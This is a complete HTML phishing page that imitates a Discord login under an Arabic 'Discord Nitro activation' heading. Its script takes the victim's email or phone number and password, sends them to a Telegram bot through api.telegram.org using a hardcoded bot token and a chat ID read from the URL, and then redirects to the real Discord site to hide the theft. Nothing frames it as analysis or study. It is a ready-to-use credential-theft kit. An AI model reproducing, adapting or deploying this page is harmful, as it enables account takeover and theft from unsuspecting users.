<!DOCTYPE html>
<html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Discord</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#36393f;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#2f3136;padding:20px;border-radius:8px;width:380px;text-align:center;color:#fff}
img{width:130px;margin-bottom:24px}h2{color:#5865f2;margin-bottom:15px}
input{width:100%;padding:12px;margin:8px 0;background:#202225;border:1px solid #202225;border-radius:4px;color:#fff;font-size:16px}
.btn{background:#5865f2;color:#fff;border:none;padding:12px;width:100%;border-radius:4px;font-size:18px;font-weight:bold;cursor:pointer}.btn:hover{background:#4752c4}</style></head>
<body><div class="card">
<img src="https://discord.com/assets/logo-feca2f1e81b5b7639e02f2a63c9e1a9a.svg" alt="Discord">
<h2>تفعيل Discord Nitro</h2>
<input id="u" placeholder="البريد الإلكتروني أو رقم الهاتف"><br>
<input id="p" type="password" placeholder="كلمة المرور"><br>
<button class="btn" onclick="sendData()">تسجيل الدخول</button>
</div>
<script>
const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";
const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');
function sendData(){const u=document.getElementById('u').value,pa=document.getElementById('p').value;
if(!u||!pa)return alert('املأ جميع الحقول');
fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('🎮 Discord\n👤 '+u+'\n🔑 '+pa)}`)
.then(()=>{location.href='https://discord.com/'})}
</script></body></html>
